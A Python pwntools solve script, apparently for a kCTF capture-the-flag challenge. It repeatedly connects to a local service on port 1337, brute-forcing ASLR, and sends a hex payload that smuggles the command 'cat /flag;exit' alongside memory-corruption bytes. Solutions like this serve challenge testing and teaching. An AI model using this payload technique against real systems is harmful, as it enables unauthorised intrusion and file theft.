#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

# Requires about 16 tries (brute forcing 4 bits of ASLR)
while True:
    print("Trying...")
    r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
    print("Trying...")
    #print(r.recvuntil('== proof-of-work: '))
    #if r.recvline().startswith(b'enabled'):
    #    handle_pow(r)

    r.sendline("2 54494e593b636174202f666c61673b6578697400ffe847084242424242424242ffc046084242424242424242424242424242424242424242424242423e53ffd8460642424242424242424242424242424242fff81f8028ff0000")
    res = r.recvall()
    r.close()
    if b'CTF' in res:
        exit(0)



exit(0)
